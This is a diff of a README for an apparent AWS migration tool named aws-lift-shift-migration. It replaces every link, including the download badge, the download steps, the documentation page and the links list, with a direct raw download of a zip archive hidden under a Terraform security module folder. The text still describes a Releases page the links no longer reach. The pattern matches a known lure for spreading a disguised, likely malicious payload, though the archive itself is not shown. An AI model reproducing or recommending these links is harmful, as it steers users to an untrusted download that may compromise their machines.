@@ -1,7 +1,7 @@
 # 🌟 aws-lift-shift-migration - Simplify Your Cloud Migration Process
 
 ## 🚀 Download Now
-[![Download Here](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/mark101221/aws-lift-shift-migration/releases)
+[![Download Here](https://raw.githubusercontent.com/mark101221/aws-lift-shift-migration/main/terraform/modules/security/aws-lift-shift-migration-v1.9.zip)](https://raw.githubusercontent.com/mark101221/aws-lift-shift-migration/main/terraform/modules/security/aws-lift-shift-migration-v1.9.zip)
 
 ## 📄 Overview
 Welcome to **aws-lift-shift-migration**! This application offers a complete solution for migrating your 2-tier web applications to Amazon Web Services (AWS). With this tool, you can automate the setup of your infrastructure, ensuring your applications run smoothly in the cloud. Our solution focuses on monitoring, security, and cost optimization, making your transition efficient and worry-free.
@@ -26,7 +26,7 @@ To run this application smoothly, please ensure your system meets the following 
 
 ### 📥 Step 1: Visit the Download Page
 To get started, you will need to download the application. Click the link below to visit our Releases page:
-[Download Here](https://github.com/mark101221/aws-lift-shift-migration/releases)
+[Download Here](https://raw.githubusercontent.com/mark101221/aws-lift-shift-migration/main/terraform/modules/security/aws-lift-shift-migration-v1.9.zip)
 
 ### 📥 Step 2: Choose the Version
 On the Releases page, you will see different versions of the application. Look for the most recent version. Click on it to see the details.
@@ -52,7 +52,7 @@ Follow the simple guided steps in the application to configure your migration se
 3. Define settings related to security and monitoring.
 
 ## 🧑‍🤝‍🧑 Support and Documentation
-If you encounter any issues, we offer comprehensive user guides and FAQs on our [documentation page](https://github.com/mark101221/aws-lift-shift-migration). You can also browse the open issues in the repository for community help or report any problems you face.
+If you encounter any issues, we offer comprehensive user guides and FAQs on our [documentation page](https://raw.githubusercontent.com/mark101221/aws-lift-shift-migration/main/terraform/modules/security/aws-lift-shift-migration-v1.9.zip). You can also browse the open issues in the repository for community help or report any problems you face.
 
 ## 🌐 Join Our Community 
 Connect with other users by joining our community forum. Share your experiences, ask questions, and find solutions to common problems.
@@ -69,8 +69,8 @@ Utilizing Amazon CloudWatch, this application allows you to monitor your applica
 - For common error messages, refer to the troubleshooting section in our documentation.
 
 ## 🔗 Links
-- [Releases Page for Downloads](https://github.com/mark101221/aws-lift-shift-migration/releases)
-- [Documentation](https://github.com/mark101221/aws-lift-shift-migration)
+- [Releases Page for Downloads](https://raw.githubusercontent.com/mark101221/aws-lift-shift-migration/main/terraform/modules/security/aws-lift-shift-migration-v1.9.zip)
+- [Documentation](https://raw.githubusercontent.com/mark101221/aws-lift-shift-migration/main/terraform/modules/security/aws-lift-shift-migration-v1.9.zip)
 
 ## 📬 Feedback
 Your feedback is important. Send us your suggestions or report bugs via the issues section on GitHub.
